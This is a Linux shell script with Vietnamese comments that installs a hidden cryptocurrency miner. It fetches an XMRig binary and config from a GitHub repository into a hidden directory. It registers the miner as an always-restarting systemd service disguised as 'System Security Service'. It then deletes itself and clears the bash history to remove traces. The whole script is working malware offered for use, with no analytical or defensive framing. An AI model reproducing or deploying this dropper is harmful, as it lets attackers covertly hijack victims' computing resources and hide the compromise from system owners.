#!/bin/sh

# 1. Kiểm tra quyền root (Sử dụng [ ] thay vì [[ ]] để tương thích sh)
if [ "$(id -u)" -ne 0 ]; then
   echo "Vui lòng chạy với quyền sudo hoặc root."
   exit 1
fi

# 2. Khai báo các thông số
SERVICE_NAME="sys_update"
DISPLAY_NAME="System Security Service"
INSTALL_DIR="/usr/lib/.sys_cache"
EXEC_NAME="sys_mgr"
CONF_URL="https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json"
BIN_URL="https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig"

# 3. Dọn dẹp các phiên bản cũ nếu có
systemctl stop $SERVICE_NAME.service >/dev/null 2>&1
systemctl disable $SERVICE_NAME.service >/dev/null 2>&1
rm -rf "$INSTALL_DIR"

# 4. Tạo thư mục và tải file
mkdir -p "$INSTALL_DIR"
curl -sL "$CONF_URL" -o "$INSTALL_DIR/config.json"
curl -sL "$BIN_URL" -o "$INSTALL_DIR/$EXEC_NAME"

# 5. Cấp quyền thực thi
chmod +x "$INSTALL_DIR/$EXEC_NAME"

# 6. Tạo Service File (Sử dụng đường dẫn tuyệt đối cho an toàn)
cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
[Unit]
Description=$DISPLAY_NAME
After=network.target

[Service]
Type=simple
WorkingDirectory=$INSTALL_DIR
ExecStart=$INSTALL_DIR/$EXEC_NAME --config=$INSTALL_DIR/config.json
Restart=always
RestartSec=15

[Install]
WantedBy=multi-user.target
EOF

# 7. Kích hoạt Service
systemctl daemon-reload
systemctl enable $SERVICE_NAME.service >/dev/null 2>&1
systemctl start $SERVICE_NAME.service

# 8. Xóa dấu vết (Self-destruct và xóa lịch sử)
# Xóa file script này
rm -- "$0"

# Làm sạch lịch sử câu lệnh
cat /dev/null > ~/.bash_history
history -c 2>/dev/null
